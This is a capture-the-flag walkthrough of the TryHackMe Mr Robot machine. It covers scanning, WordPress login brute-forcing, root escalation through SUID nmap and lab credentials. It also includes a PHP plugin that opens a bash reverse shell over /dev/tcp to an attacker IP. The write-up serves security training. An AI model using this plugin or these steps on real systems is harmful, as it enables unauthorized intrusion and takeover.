---
title: TryHackMe - Mr Robot CTF
author: r2cook
categories: [TryHackMe]
tags: [wordpress, wpstorm, php, PrivEsc, GTFOBins, nmap]
render_with_liquid: false
media_subpath: /images/thm/mrrobotctf/
image:
  path: room_card.jpeg
---

> In this walkthrough, we compromise the TryHackMe **MrRobot** machine by enumerating the exposed web infrastructure, discovering a **robots.txt** file containing a wordlist and the first flag, brute-forcing the **WordPress admin login** using the discovered dictionary to obtain valid credentials, uploading a **malicious WordPress plugin** to achieve remote code execution, cracking a **stored MD5 password hash** to switch to the robot user, and finally escalating privileges through a **SUID-enabled Nmap binary** using its interactive mode to capture the final root flag.

## Initial Setup

Add the target IP to your hosts file for easier reference:

```plaintext
10.113.169.189 mrrobot.thm
```
{: file="/etc/hosts" }

---

## Enumeration

### Full Port Scan

We begin with a comprehensive port scan using RustScan for speed, followed by detailed service enumeration with Nmap:

```shell
----------------------------------------------------------------------------------------
» rustscan -a mrrobot.thm -g                                                                                                   
10.113.169.189 -> [22,80,443]  
--------------------------------------------------------------------------------------- 
» nmap -p 22,80,443 -sV -sC -T4 -oN nmap_scan.txt mrrobot.thm                                                                                
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-10 01:17 EET  
Nmap scan report for mrrobot.thm (10.113.169.189)  
Host is up (0.067s latency).  
  
PORT    STATE SERVICE  VERSION  
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   3072 1e:60:98:f3:48:69:31:21:5a:d5:aa:62:ff:82:b9:ee (RSA)  
|   256 db:ac:38:fa:ec:fc:85:30:01:00:dc:12:07:8b:bf:09 (ECDSA)  
|_  256 78:c3:6c:0d:a5:f8:0b:7a:74:cc:0b:e3:be:b9:28:36 (ED25519)  
80/tcp  open  http     Apache httpd  
|_http-server-header: Apache  
|_http-title: Site doesn't have a title (text/html).  
443/tcp open  ssl/http Apache httpd  
|_http-server-header: Apache  
| ssl-cert: Subject: commonName=www.example.com  
| Not valid before: 2015-09-16T10:45:03  
|_Not valid after:  2025-09-13T10:45:03  
|_http-title: Site doesn't have a title (text/html).  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 19.38 seconds  
--------------------------------------------------------------------------------------- 
```
{: .nolineno }
--------------------------------------------------------------------------------------- 

**Findings:** Three open ports - SSH (22), HTTP (80), and HTTPS (443) - indicating a web server with potential CMS installations.

---

## Web Portal Enumeration (Port 80)

### Initial Website Reconnaissance

![](web_portal_enum_.webp){: width="800" height="400" .shadow }

The homepage reveals what appears to be a blog or CMS-based site. Time for deeper directory enumeration.

### Directory Bruteforcing with ffuf
```shell
» ffuf -u http://mrrobot.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directorie  
s.txt -e .php,.txt,.zip,.old,.log -mc 200,204,301,302,307,401,403 -fc 27 -c | tee ffuf_spip_raft_small_result.txt  
  
       /'___\  /'___\           /'___\       
      /\ \__/ /\ \__/  __  __  /\ \__/       
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
        \ \_\   \ \_\  \ \____/  \ \_\       
         \/_/    \/_/   \/___/    \/_/       
  
      v2.1.0  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://mrrobot.thm/FUZZ  
:: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-directories.txt  
:: Extensions       : .php .txt .zip .old .log   
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200,204,301,302,307,401,403  
:: Filter           : Response status: 27  
________________________________________________  
  
images                  [Status: 301, Size: 234, Words: 14, Lines: 8, Duration: 61ms]  
admin                   [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 69ms]  
js                      [Status: 301, Size: 230, Words: 14, Lines: 8, Duration: 57ms]  
wp-content              [Status: 301, Size: 238, Words: 14, Lines: 8, Duration: 59ms]  
css                     [Status: 301, Size: 231, Words: 14, Lines: 8, Duration: 56ms]  
wp-admin                [Status: 301, Size: 236, Words: 14, Lines: 8, Duration: 55ms]  
wp-includes             [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 56ms]  
login                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 419ms]  
blog                    [Status: 301, Size: 232, Words: 14, Lines: 8, Duration: 56ms]  
feed                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 290ms]  
rss                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 342ms]  
video                   [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 56ms]  
sitemap                 [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 57ms]  
image                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 339ms]  
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 315ms]  
audio                   [Status: 301, Size: 233, Words: 14, Lines: 8, Duration: 56ms]  
phpmyadmin              [Status: 403, Size: 94, Words: 14, Lines: 1, Duration: 56ms]  
wp-feed.php             [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 312ms]  
dashboard               [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 328ms]  
wp-login.php            [Status: 200, Size: 2599, Words: 115, Lines: 53, Duration: 336ms]  
wp-login                [Status: 200, Size: 2599, Words: 115, Lines: 53, Duration: 351ms]  
0                       [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 316ms]  
atom                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 317ms]  
robots                  [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 56ms]  
robots.txt              [Status: 200, Size: 41, Words: 2, Lines: 4, Duration: 56ms]  
license                 [Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 126ms]  
license.txt             [Status: 200, Size: 309, Words: 25, Lines: 157, Duration: 114ms]  
intro                   [Status: 200, Size: 516314, Words: 2076, Lines: 2028, Duration: 59ms]  
Image                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 327ms]  
IMAGE                   [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 328ms]  
rss2                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 343ms]  
readme                  [Status: 200, Size: 64, Words: 14, Lines: 2, Duration: 57ms]  
rdf                     [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 309ms]  
wp-register.php         [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 363ms]  
0000                    [Status: 301, Size: 0, Words: 1, Lines: 1, Duration: 335ms]  
wp-config               [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 342ms]  
wp-config.php           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 334ms]  
:: Progress: [120690/120690] :: Job [1/1] :: 117 req/sec :: Duration: [0:17:29] :: Errors: 0 ::
```
{: .nolineno }

**Notable Discoveries:**

- `/admin` - Potential administration panel
    
- `/wp-admin`, `/wp-content`, `/wp-includes` - WordPress installation detected
    
- `/phpmyadmin` - Database management interface (403 Forbidden)
    
- `/robots.txt` - Contains interesting entries
    

### Analyzing robots.txt

`/robots.txt` reveals valuable information:

```text
User-agent: *
fsocity.dic
key-1-of-3.txt
```

![](robots_txt.webp){: width="800" height="400" .shadow }

### Capturing the First Flag

`/key-1-of-3.txt` yields our first flag:

![](key_1_of_3_txt.webp){: width="800" height="400" .shadow }

### Downloading the Dictionary

`/fsocity.dic` appears to be a wordlist - likely for brute-force attacks:

![](wget_fsocity_dic.webp){: width="800" height="400" .shadow }

---

## WordPress Admin Portal Exploitation

### Login Page Discovery

Navigating to `/wp-admin` presents the WordPress login interface:

![](wp_admin_login.webp){: width="800" height="400" .shadow }

### Brute-Forcing Credentials

Initial attempts with `wpscan` for user enumeration proved unsuccessful. Manual enumeration attempts also failed. The downloaded `fsocity.dic` wordlist provides our attack vector.

**Capturing the Login Request with Burp Suite:**

![](wp_login_POST_req_with_burp.webp){: width="800" height="400" .shadow }

**The Challenge:** Hydra consistently failed to work with the WordPress login form. As an alternative, I utilized my custom tool `wpstorm` (available at [https://github.com/cyperowl/wpstorm.git](https://github.com/cyperowl/wpstorm.git)):

```shell
» wpstorm -u http://mrrobot.thm/wp-login.php -w fsocity.dic -t 500
```
{: .nolineno }

![](wpstorm_found_creds.webp){: width="800" height="400" .shadow }

**Successful Credentials Found:**

```text
Username: Elliot
Password: ER28-0652
```

### WordPress Admin Access

Logging in with these credentials grants administrative access:

![](wp_admin_login_success.webp){: width="800" height="400" .shadow }

![](wp_admin_users_section.webp){: width="800" height="400" .shadow }

---

## Gaining Remote Code Execution

### Creating the Malicious Plugin

Create a reverse shell plugin (`reverse_shell.php`):

```php
<?php  
/**  
* Plugin Name: Wordpress Maint Shell  
* Author: Wordpress  
*/  
  
exec("/bin/bash -c 'bash -i >& /dev/tcp/<YOUR_IP>/9001 0>&1'");  
?>
```

Compress it into a ZIP archive:

```shell
» zip archive.zip reverse_shell.php
```
{: .nolineno }

### Setting Up the Listener

Start a netcat listener on your attacking machine:

![](open_nc_listener.webp){: width="800" height="400" .shadow }

### Uploading the Plugin

Navigate to **Plugins → Add New** in the WordPress admin panel:

![](wp_admin_plugins_add_new.webp){: width="800" height="400" .shadow }

Click **Upload Plugin**:

![](wp_admin_plugins_upload_plugin.webp){: width="800" height="400" .shadow }

Select your `archive.zip` and click **Install Now**:

![](wp_admin_plugins_install_now.webp){: width="800" height="400" .shadow }

### Activating the Shell

Click **Activate Plugin** to trigger the reverse shell:

![](wp_admin_plugins_active_plugin.webp){: width="800" height="400" .shadow }

### Shell Obtained!

![](reverse_sehll_obtained.webp){: width="800" height="400" .shadow }

---

## Post-Exploitation & User Flag

### Stabilizing the Shell

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
Ctrl+Z
stty raw -echo; fg
```
{: .nolineno }

### Locating the Second Flag

Navigate to `/home/robot` - the second flag is present but permission denied. However, we find `password.raw-md5` which is readable:

```text
robot:c3fcd3d76192e4007dfb496cca67e13b
```

### Cracking the MD5 Hash

Decoding the hash reveals the password:

![](md5hashing_net.webp){: width="800" height="400" .shadow }

**Password:** `abcdefghijklmnopqrstuvwxyz`

### Switching to Robot User

```shell
daemon@ip-10-113-136-143:/home/robot$ su robot  
Password: abcdefghijklmnopqrstuvwxyz
$ id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
```
{: .nolineno }

Now we can read `key-2-of-3.txt` and capture the second flag:

![](privesc_robot_reading_second_falg.webp){: width="800" height="400" .shadow }

---

## Privilege Escalation to Root

### SUID Binary Discovery

Searching for SUID binaries reveals interesting targets:

```shell
robot@ip-10-113-136-143:~$ find / -perm -4000 -type f 2>/dev/null  
/bin/umount  
/bin/mount  
/bin/su  
/usr/bin/passwd  
/usr/bin/newgrp  
/usr/bin/chsh  
/usr/bin/chfn  
/usr/bin/gpasswd  
/usr/bin/sudo  
/usr/bin/pkexec  
/usr/local/bin/nmap   # <-- Interesting!
/usr/lib/openssh/ssh-keysign  
/usr/lib/eject/dmcrypt-get-device  
/usr/lib/policykit-1/polkit-agent-helper-1  
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper  
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
```
{: .nolineno }

### Exploiting Nmap SUID Binary

`/usr/local/bin/nmap` with SUID permissions is a known privilege escalation vector. Consulting GTFOBins:

![](gtfobins_searching_for_namp.webp){: width="800" height="400" .shadow }

**Exploitation Command:**

```shell

nmap --interactive
!/bin/sh
```
{: .nolineno }

### Root Access Achieved!

![](privesc_root.webp){: width="800" height="400" .shadow }

### Capturing the Final Flag

Navigate to `/root/key-3-of-3.txt` to capture the third and final flag:

```shell
#  cat /root/key-3-of-3.txt
```
{: .nolineno }

---